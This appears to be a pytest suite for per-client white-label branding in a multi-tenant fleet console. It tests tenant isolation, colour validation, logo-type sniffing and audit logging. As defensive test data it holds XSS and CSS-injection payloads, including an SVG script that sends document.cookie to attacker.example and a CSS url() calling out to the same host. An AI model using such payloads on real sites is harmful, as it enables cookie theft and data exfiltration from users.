"""Per-client white-label branding: fallback, tenant isolation, and the two sinks.

The three things that would make this feature a liability rather than a
feature, each with a test that fails without the guard:

* **Leakage.** One tenant's brand appearing on another's portal, or one
  tenant's logo being readable by another tenant (or by anybody who can count).
* **CSS injection.** ``primary_color`` is interpolated into a ``style``
  attribute. Escaping does not help there -- ``red; background-image:
  url(https://attacker/?c=)`` needs no quote to escape and still calls out --
  so the value is validated on the way in AND re-checked on the way out.
* **A logo that executes.** An uploaded file served from our own origin. SVG is
  a document that can carry ``<script>``; a declared content type is whatever
  the client said. So the bytes decide, and anything already stored goes out
  sandboxed.
"""

from __future__ import annotations

import io
import re

import pytest
from fastapi.testclient import TestClient

from central import branding
from central import models as m
from central import runtime
from central.main import app
from central.security import hash_password
from tests.test_dashboard_a11y import _parse

PNG_BYTES = (
    b"\x89PNG\r\n\x1a\n"
    b"\x00\x00\x00\rIHDR"
    b"\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
    b"\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4"
    b"\x00\x00\x00\x00IEND\xaeB`\x82"
)
GIF_BYTES = b"GIF89a" + b"\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;"
SVG_WITH_SCRIPT = (
    b'<svg xmlns="http://www.w3.org/2000/svg"><script>'
    b'fetch("https://attacker.example/?c="+document.cookie)</script></svg>'
)


def _seed_two_clients(db):
    """Two tenants, each with a portal user. The second exists so every
    isolation claim has something to leak TO."""
    a = m.Client(name="Acme Legal")
    b = m.Client(name="Borden Manufacturing")
    db.add_all([a, b])
    db.flush()
    for client, tag in ((a, "acme"), (b, "borden")):
        site = m.Site(client_id=client.id, name="HQ")
        db.add(site)
        db.flush()
        db.add(m.Printer(
            client_id=client.id, site_id=site.id, ip="10.0.0.10",
            brand="HP", model="M404", display_name=f"{tag}-printer",
            status=m.PrinterStatus.ok, discovery_state=m.DiscoveryState.approved,
        ))
        db.add(m.User(
            username=f"{tag}-ro", password_hash=hash_password("pw"),
            role=m.UserRole.client_readonly, client_id=client.id,
        ))
    db.add(m.User(username="admin", password_hash=hash_password("pw"),
                  role=m.UserRole.admin))
    db.add(m.User(username="tech", password_hash=hash_password("pw"),
                  role=m.UserRole.tech))
    db.commit()
    return a, b


def _login(username: str) -> TestClient:
    http = TestClient(app)
    resp = http.post("/login", data={"username": username, "password": "pw"},
                     follow_redirects=False)
    assert resp.status_code == 303, resp.text[:200]
    return http


@pytest.fixture()
def two_clients(db):
    return _seed_two_clients(db)


# --------------------------------------------------------------------------- #
# Fallback -- a client with nothing set must render exactly as today
# --------------------------------------------------------------------------- #
def test_unset_client_renders_the_global_branding(db, two_clients):
    runtime.save_settings(db, {"app.name": "MSP Fleet Console",
                               "app.primary_color": "#123456"})
    body = _login("acme-ro").get("/portal").text
    assert "MSP Fleet Console" in body
    assert "background-color: #123456" in body


def test_fallback_is_per_field(db, two_clients):
    """A client that overrides only the colour keeps the MSP's name."""
    a, _b = two_clients
    runtime.save_settings(db, {"app.name": "MSP Fleet Console"})
    a.brand_primary_color = "#ff8800"
    db.commit()
    body = _login("acme-ro").get("/portal").text
    assert "MSP Fleet Console" in body           # inherited
    assert "background-color: #ff8800" in body   # overridden


def _nav(html: str) -> str:
    """Just the chrome: everything from the nav element to the main landmark."""
    return html.split('<nav aria-label="Primary"', 1)[-1].split("<main", 1)[0]


def test_client_branding_never_reaches_a_staff_page(db, two_clients):
    """An operator's chrome must not change identity between tenants -- a nav
    bar wearing the customer's logo reads as 'you are inside their system'."""
    a, _b = two_clients
    runtime.save_settings(db, {"app.name": "MSP Fleet Console"})
    a.brand_name = "Acme Legal Print"
    a.brand_primary_color = "#ff0000"
    db.commit()
    http = _login("admin")
    for page in ("/", f"/clients/{a.id}", f"/manage/clients/{a.id}", "/manage"):
        nav = _nav(http.get(page).text)
        assert "MSP Fleet Console" in nav, page
        assert "Acme Legal Print" not in nav, page
        # #ff0000 may legitimately appear further down /manage/clients/<id> as
        # the branding preview swatch; the chrome is what must not move.
        assert "background-color: #ff0000" not in nav, page
        assert "background-color: #0f172a" in nav, page


# --------------------------------------------------------------------------- #
# Two clients, two brandings -- the isolation proof
# --------------------------------------------------------------------------- #
def test_two_clients_two_brandings(db, two_clients):
    a, b = two_clients
    runtime.save_settings(db, {"app.name": "MSP Fleet Console",
                               "app.primary_color": "#0f172a"})
    a.brand_name = "Acme Legal Print"
    a.brand_primary_color = "#a10000"
    a.brand_logo_url = "https://cdn.acme.example/logo.png"
    db.commit()

    branded = _login("acme-ro").get("/portal").text
    plain = _login("borden-ro").get("/portal").text

    assert "Acme Legal Print" in branded
    assert "background-color: #a10000" in branded
    assert "https://cdn.acme.example/logo.png" in branded

    # B falls back to global on every field, and sees nothing of A.
    assert "MSP Fleet Console" in plain
    assert "background-color: #0f172a" in plain
    assert "Acme Legal Print" not in plain
    assert "#a10000" not in plain
    assert "acme.example" not in plain


def test_admin_portal_preview_wears_the_client_brand(db, two_clients):
    """/portal?client_id=N is how an operator checks what a customer sees."""
    a, b = two_clients
    a.brand_name = "Acme Legal Print"
    db.commit()
    http = _login("admin")
    assert "Acme Legal Print" in http.get(f"/portal?client_id={a.id}").text
    assert "Acme Legal Print" not in http.get(f"/portal?client_id={b.id}").text


# --------------------------------------------------------------------------- #
# Colour: an injection sink, validated rather than escaped
# --------------------------------------------------------------------------- #
HOSTILE_COLORS = [
    "#0f172a; background-image: url(https://attacker.example/?c=)",
    "red;} body{display:none}",
    "expression(alert(1))",
    "url(javascript:alert(1))",
    '"><script>alert(1)</script>',
    "var(--x)",
    "#12345",          # nearly right, still not a colour
    "rgb(1,2,3)",      # valid CSS, deliberately not accepted per-client
]


@pytest.mark.parametrize("hostile", HOSTILE_COLORS)
def test_hostile_colour_is_refused_at_the_route(db, two_clients, hostile):
    a, _b = two_clients
    resp = _login("admin").post(
        f"/manage/clients/{a.id}/branding",
        data={"brand_name": "Acme Legal Print", "brand_primary_color": hostile,
              "brand_logo_url": ""},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    db.expire_all()
    assert db.get(m.Client, a.id).brand_primary_color is None
    # Refused wholesale: an operator must not end up with half a form applied.
    assert db.get(m.Client, a.id).brand_name is None
    assert db.scalar(
        m.AuditLog.__table__.select().where(
            m.AuditLog.action == "client.branding.refused")
    ) is not None


@pytest.mark.parametrize("hostile", HOSTILE_COLORS)
def test_hostile_colour_written_directly_to_the_db_never_renders(db, two_clients, hostile):
    """The database is not a trust boundary. A value that got in by a hand
    edit, a restored backup or a future writer must still not reach the CSS.

    The value is truncated to the column width first, and that is the point
    rather than a workaround: ``brand_primary_color`` is ``String(32)``, and a
    real backend ENFORCES that. Postgres refuses the 60-character payload with
    StringDataRightTruncation, so writing it unmodified tested the column's
    length rather than the renderer's defence -- and passed on SQLite only
    because SQLite does not enforce VARCHAR limits at all. What must not render
    is whatever can actually be *in* the column, which is bounded by its width.
    """
    a, _b = two_clients
    a.brand_primary_color = hostile[:32]
    db.commit()
    body = _login("acme-ro").get("/portal").text
    assert "attacker.example" not in body
    assert "expression(" not in body
    assert "display:none" not in body
    assert "background-color: #0f172a" in body  # fell back to the global value


def test_hostile_global_colour_never_renders(db, two_clients):
    """Same guard on the global setting, which predates any validation."""
    runtime.save_settings(
        db, {"app.primary_color": "#fff; background-image: url(https://attacker.example/x)"}
    )
    body = _login("admin").get("/").text
    assert "attacker.example" not in body
    assert "background-color: #0f172a" in body


def test_good_colour_is_accepted_and_normalised(db, two_clients):
    a, _b = two_clients
    _login("admin").post(
        f"/manage/clients/{a.id}/branding",
        data={"brand_name": " Acme Legal Print ", "brand_primary_color": "#A10000",
              "brand_logo_url": ""},
        follow_redirects=False,
    )
    db.expire_all()
    row = db.get(m.Client, a.id)
    assert row.brand_primary_color == "#a10000"
    assert row.brand_name == "Acme Legal Print"


# --------------------------------------------------------------------------- #
# Logo upload: the bytes decide
# --------------------------------------------------------------------------- #
def _upload(http, client_id, filename, data, content_type):
    return http.post(
        f"/manage/clients/{client_id}/branding/logo",
        files={"logo": (filename, io.BytesIO(data), content_type)},
        follow_redirects=False,
    )


def test_png_upload_stores_bytes_and_wires_the_url(db, two_clients):
    a, _b = two_clients
    assert _upload(_login("admin"), a.id, "logo.png", PNG_BYTES, "image/png").status_code == 303
    db.expire_all()
    asset = db.get(m.AppAsset, branding.client_logo_asset_name(a.id))
    assert asset is not None and asset.data == PNG_BYTES
    assert asset.content_type == "image/png"
    assert db.get(m.Client, a.id).brand_logo_url == f"/branding/clients/{a.id}/logo"


def test_svg_logo_is_refused(db, two_clients):
    a, _b = two_clients
    resp = _upload(_login("admin"), a.id, "logo.svg", SVG_WITH_SCRIPT, "image/svg+xml")
    assert resp.status_code == 303
    assert db.get(m.AppAsset, branding.client_logo_asset_name(a.id)) is None
    assert db.get(m.Client, a.id).brand_logo_url is None


def test_svg_relabelled_as_png_is_refused(db, two_clients):
    """The declared type is the attacker's to choose; the magic bytes are not."""
    a, _b = two_clients
    _upload(_login("admin"), a.id, "logo.png", SVG_WITH_SCRIPT, "image/png")
    assert db.get(m.AppAsset, branding.client_logo_asset_name(a.id)) is None


def test_html_polyglot_is_refused(db, two_clients):
    a, _b = two_clients
    _upload(_login("admin"), a.id, "logo.png",
            b"<html><script>alert(1)</script></html>", "image/png")
    assert db.get(m.AppAsset, branding.client_logo_asset_name(a.id)) is None


def test_oversized_logo_is_refused(db, two_clients):
    a, _b = two_clients
    huge = PNG_BYTES + b"\x00" * branding.LOGO_MAX_BYTES
    _upload(_login("admin"), a.id, "logo.png", huge, "image/png")
    assert db.get(m.AppAsset, branding.client_logo_asset_name(a.id)) is None


def test_stored_type_comes_from_the_bytes_not_the_name(db, two_clients):
    a, _b = two_clients
    _upload(_login("admin"), a.id, "logo.png", GIF_BYTES, "image/gif")
    asset = db.get(m.AppAsset, branding.client_logo_asset_name(a.id))
    assert asset.content_type == "image/gif"


def test_refused_upload_is_audited(db, two_clients):
    a, _b = two_clients
    _upload(_login("admin"), a.id, "logo.svg", SVG_WITH_SCRIPT, "image/svg+xml")
    actions = [r.action for r in db.query(m.AuditLog).all()]
    assert "client.branding.logo.refused" in actions


def test_global_uploader_also_refuses_svg(db, two_clients):
    """One uploader, one set of rules: the Settings → Branding path was the
    one that accepted SVG, and it is the same validator now."""
    http = _login("admin")
    resp = http.post(
        "/settings/branding/logo",
        files={"logo": ("logo.svg", io.BytesIO(SVG_WITH_SCRIPT), "image/svg+xml")},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    assert db.get(m.AppAsset, "logo") is None
    assert "SVG" in http.get("/settings?group=branding").text


def test_a_stored_svg_is_served_sandboxed(db, two_clients):
    """An install that took an SVG before the refusal existed still has it in
    the row. It must not be able to execute on this origin."""
    db.add(m.AppAsset(name="logo", content_type="image/svg+xml", data=SVG_WITH_SCRIPT))
    db.commit()
    resp = TestClient(app).get("/branding/logo")
    assert resp.status_code == 200
    assert "sandbox" in resp.headers["content-security-policy"]
    assert resp.headers["x-content-type-options"] == "nosniff"


# --------------------------------------------------------------------------- #
# Serving a client logo is tenant-scoped
# --------------------------------------------------------------------------- #
def test_client_logo_is_tenant_scoped(db, two_clients):
    a, b = two_clients
    _upload(_login("admin"), a.id, "logo.png", PNG_BYTES, "image/png")
    url = f"/branding/clients/{a.id}/logo"

    assert _login("acme-ro").get(url).status_code == 200        # its own tenant
    assert _login("admin").get(url).status_code == 200          # staff
    assert _login("tech").get(url).status_code == 200           # staff
    assert _login("borden-ro").get(url).status_code == 404      # another tenant
    assert TestClient(app).get(url).status_code == 404          # no session
    # And nothing about client B's (absent) logo distinguishes "no logo" from
    # "not yours" -- both are 404.
    assert _login("acme-ro").get(f"/branding/clients/{b.id}/logo").status_code == 404


def test_client_logo_is_not_publicly_cacheable(db, two_clients):
    a, _b = two_clients
    _upload(_login("admin"), a.id, "logo.png", PNG_BYTES, "image/png")
    resp = _login("acme-ro").get(f"/branding/clients/{a.id}/logo")
    assert resp.headers["cache-control"].startswith("private")
    assert "sandbox" in resp.headers["content-security-policy"]


def test_uploaded_logo_shows_on_the_portal(db, two_clients):
    a, b = two_clients
    _upload(_login("admin"), a.id, "logo.png", PNG_BYTES, "image/png")
    assert f"/branding/clients/{a.id}/logo" in _login("acme-ro").get("/portal").text
    assert f"/branding/clients/{a.id}/logo" not in _login("borden-ro").get("/portal").text


def test_deleting_the_logo_clears_the_url(db, two_clients):
    a, _b = two_clients
    http = _login("admin")
    _upload(http, a.id, "logo.png", PNG_BYTES, "image/png")
    http.post(f"/manage/clients/{a.id}/branding/logo/delete", follow_redirects=False)
    db.expire_all()
    assert db.get(m.AppAsset, branding.client_logo_asset_name(a.id)) is None
    assert db.get(m.Client, a.id).brand_logo_url is None


def test_deleting_the_logo_keeps_an_external_url(db, two_clients):
    a, _b = two_clients
    a.brand_logo_url = "https://cdn.acme.example/logo.png"
    db.commit()
    _login("admin").post(f"/manage/clients/{a.id}/branding/logo/delete",
                         follow_redirects=False)
    db.expire_all()
    assert db.get(m.Client, a.id).brand_logo_url == "https://cdn.acme.example/logo.png"


def test_deleting_the_client_deletes_its_logo_bytes(db, two_clients):
    """app_assets has no FK to cascade along, and SQLite reuses row ids -- so a
    client created after this delete could otherwise inherit the logo.

    Deliberately a client with no printers: deleting one that HAS printers
    raises IntegrityError today (printers.client_id is NOT NULL with no
    cascade), which is a pre-existing defect in the delete path and not this
    feature's to fix.
    """
    fresh = m.Client(name="Ephemeral Co")
    db.add(fresh)
    db.commit()
    fresh_id = fresh.id
    http = _login("admin")
    _upload(http, fresh_id, "logo.png", PNG_BYTES, "image/png")
    key = branding.client_logo_asset_name(fresh_id)
    assert db.get(m.AppAsset, key) is not None
    assert http.post(f"/manage/clients/{fresh_id}/delete",
                     follow_redirects=False).status_code == 303
    # expunge, not expire: the row is gone, so a refresh of the identity-mapped
    # instance would raise instead of reporting the deletion.
    db.expunge_all()
    assert db.get(m.Client, fresh_id) is None
    assert db.get(m.AppAsset, key) is None


# --------------------------------------------------------------------------- #
# Logo URL validation
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("bad", [
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    'https://cdn.example/x.png" onerror="alert(1)',
    "ftp://cdn.example/x.png",
])
def test_hostile_logo_url_is_refused(db, two_clients, bad):
    a, _b = two_clients
    _login("admin").post(
        f"/manage/clients/{a.id}/branding",
        data={"brand_name": "", "brand_primary_color": "", "brand_logo_url": bad},
        follow_redirects=False,
    )
    db.expire_all()
    assert db.get(m.Client, a.id).brand_logo_url is None


# --------------------------------------------------------------------------- #
# Authorisation + audit
# --------------------------------------------------------------------------- #
def test_a_customer_cannot_brand_their_own_portal(db, two_clients):
    """client_readonly is a viewer. Branding is an operator action."""
    a, _b = two_clients
    http = _login("acme-ro")
    resp = http.post(f"/manage/clients/{a.id}/branding",
                     data={"brand_name": "Self Service", "brand_primary_color": "",
                           "brand_logo_url": ""},
                     follow_redirects=False)
    # Refused (403), not bounced to the sign-in form -- they ARE signed in.
    assert resp.status_code == 403
    upload = _upload(http, a.id, "logo.png", PNG_BYTES, "image/png")
    assert upload.status_code == 403
    db.expire_all()
    assert db.get(m.Client, a.id).brand_name is None
    assert db.get(m.AppAsset, branding.client_logo_asset_name(a.id)) is None


def test_a_customer_cannot_brand_another_tenant(db, two_clients):
    _a, b = two_clients
    http = _login("acme-ro")
    http.post(f"/manage/clients/{b.id}/branding",
              data={"brand_name": "Owned", "brand_primary_color": "",
                    "brand_logo_url": ""}, follow_redirects=False)
    db.expire_all()
    assert db.get(m.Client, b.id).brand_name is None


def test_branding_changes_are_audited(db, two_clients):
    a, _b = two_clients
    http = _login("admin")
    http.post(f"/manage/clients/{a.id}/branding",
              data={"brand_name": "Acme Legal Print", "brand_primary_color": "#a10000",
                    "brand_logo_url": ""}, follow_redirects=False)
    _upload(http, a.id, "logo.png", PNG_BYTES, "image/png")
    http.post(f"/manage/clients/{a.id}/branding/logo/delete", follow_redirects=False)
    rows = {r.action: r for r in db.query(m.AuditLog).all()}
    assert "client.branding.update" in rows
    assert "client.branding.logo" in rows
    assert "client.branding.logo.delete" in rows
    assert "#a10000" in rows["client.branding.update"].detail
    assert f"client:{a.id}" in rows["client.branding.logo"].target
    assert "image/png" in rows["client.branding.logo"].detail


# --------------------------------------------------------------------------- #
# The decision: alert mail stays global
# --------------------------------------------------------------------------- #
def test_alert_email_keeps_the_global_brand(db, two_clients):
    """Deliberate, and tested so it cannot drift: channels are shared across
    tenants and digests span several, so a message branded as one customer is
    a message branded as the wrong customer for everyone else on that channel.
    """
    from central.channels.base import Notification
    from central.channels.email import EmailChannel

    a, _b = two_clients
    a.brand_name = "Acme Legal Print"
    db.commit()
    runtime.save_settings(db, {"app.name": "MSP Fleet Console"})
    msg = EmailChannel(
        name="email", config={"to": "ops@msp.example"}, runtime=runtime.load_settings(db)
    ).build_message(Notification(
        title="Toner low", body="…", severity="warning", client_name=a.name,
    ))
    assert msg["Subject"].startswith("[MSP Fleet Console]")
    assert "Acme" not in msg["Subject"]


# --------------------------------------------------------------------------- #
# UI
# --------------------------------------------------------------------------- #
def test_client_page_controls_all_have_accessible_names(db, two_clients):
    """A placeholder is not a label. Asserted against the rendered DOM, which
    is the only thing that can tell a wrapping <label> from an adjacent one."""
    a, _b = two_clients
    _upload(_login("admin"), a.id, "logo.png", PNG_BYTES, "image/png")
    parsed = _parse(_login("admin").get(f"/manage/clients/{a.id}").text)
    unlabelled = [
        c for c in parsed.controls
        if not c["wrapped"] and not c["aria"]
        and not (c["id"] and c["id"] in parsed.label_for)
    ]
    assert not unlabelled, [c["name"] for c in unlabelled]


def test_confirm_dialogs_do_not_compile_operator_text_as_script(db, two_clients):
    """HTML escaping is not JS escaping.

    An attribute's character references are decoded by the HTML parser BEFORE
    the value is compiled as script, so a name interpolated into
    ``onsubmit="return confirm('Delete <name>?')"`` gets its ``&#39;`` back as
    a real quote and closes the string literal. The names on this page are
    operator free-text and the printer one comes off a device, so they travel
    in data- attributes and are read through ``dataset`` instead.
    """
    hostile = "x'); alert(1); //"
    victim = m.Client(name=hostile)
    db.add(victim)
    db.commit()
    html = _login("admin").get(f"/manage/clients/{victim.id}").text
    handlers = re.findall(r'onsubmit="([^"]*)"', html) + re.findall(r'onclick="([^"]*)"', html)
    assert handlers, "page rendered no inline handlers; the selector needs updating"
    for handler in handlers:
        assert "alert(1)" not in handler, handler
    # The name is still shown to the operator -- as data, via the DOM.
    assert 'data-name="x&#39;); alert(1); //"' in html


def test_branding_form_is_on_the_client_page(db, two_clients):
    a, _b = two_clients
    body = _login("admin").get(f"/manage/clients/{a.id}").text
    assert f'action="/manage/clients/{a.id}/branding"' in body
    assert f'action="/manage/clients/{a.id}/branding/logo"' in body
    # The decision is stated where an operator will read it.
    assert "Alert emails and tickets always use the global branding." in body


# --------------------------------------------------------------------------- #
# Unit-level guards
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("value,expected", [
    ("#abc", "#abc"),
    ("#AABBCC", "#aabbcc"),
    ("  #0f172a  ", "#0f172a"),
    ("#abcd", None),
    ("rgb(1,2,3)", None),
    ("navy", None),
    ("", None),
    (None, None),
])
def test_normalise_hex_color(value, expected):
    assert branding.normalise_hex_color(value) == expected


@pytest.mark.parametrize("value,expected", [
    ("#0f172a", "#0f172a"),
    ("rgb(15,23,42)", "rgb(15,23,42)"),      # documented since app.primary_color shipped
    ("rgba(15, 23, 42, 0.5)", "rgba(15, 23, 42, 0.5)"),
    ("navy", "navy"),                        # letters only: cannot escape a declaration
    ("red;}body{display:none}", "#0f172a"),
    ("url(https://a/b)", "#0f172a"),
    ("expression(alert(1))", "#0f172a"),
    ("", "#0f172a"),
])
def test_safe_css_color(value, expected):
    assert branding.safe_css_color(value) == expected


@pytest.mark.parametrize("data,expected", [
    (PNG_BYTES, "image/png"),
    (b"\xff\xd8\xff\xe0JFIF", "image/jpeg"),
    (GIF_BYTES, "image/gif"),
    (b"RIFF\x00\x00\x00\x00WEBPVP8 ", "image/webp"),
    (SVG_WITH_SCRIPT, None),
    (b"MZ\x90\x00", None),
    (b"", None),
])
def test_sniff_image_type(data, expected):
    assert branding.sniff_image_type(data) == expected


def test_asset_key_is_derived_from_the_id_and_fits_the_column(db):
    key = branding.client_logo_asset_name(2 ** 31 - 1)
    assert key.startswith("client:") and key.endswith(":logo")
    assert len(key) <= 40  # app_assets.name is String(40)
